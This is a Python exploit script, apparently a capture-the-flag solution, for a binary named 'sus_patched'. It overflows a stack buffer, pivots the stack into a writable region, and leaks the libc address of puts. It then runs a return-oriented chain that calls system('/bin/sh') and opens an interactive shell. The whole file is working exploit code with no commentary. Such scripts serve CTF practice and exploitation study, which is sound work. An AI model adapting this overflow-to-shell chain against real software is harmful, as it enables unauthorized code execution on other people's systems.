#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./sus_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    free_space_base = 0x404000 + 0x100

    payload = b""
    payload += b"A" * 72
    payload += ptr.p64(next(exe.gadget("pop rbp; ret;")))
    payload += ptr.p64(free_space_base + 0x640)
    payload += ptr.p64(unwrap(exe.symbol("main")) + 51)
    io.sendlineafter(b"?\n", payload)

    payload = b""
    payload += b"B" * 0x10
    payload += ptr.p64(unwrap(exe.got("puts")))
    payload += b"A" * 8
    payload += ptr.p64(unwrap(exe.plt("puts")))
    payload += ptr.p64(unwrap(exe.symbol("main")) + 1)
    payload = payload.ljust(72 - 8, b"B")
    payload += ptr.p64(free_space_base + 0x600 + 0x10 + 8)  # rbp
    payload += ptr.p64(unwrap(exe.symbol("main")) + 63)
    io.sendline(payload)

    libc.base = ptr.u64(io.recv(6)) - unwrap(libc.symbol("puts"))

    payload = b""
    payload += b"A" * (72 - 8)
    payload += ptr.p64(free_space_base + 0x500)
    payload += ptr.p64(next(libc.gadget("ret;")))
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh\0")))
    payload += ptr.p64(unwrap(libc.symbol("system")))
    io.sendline(payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
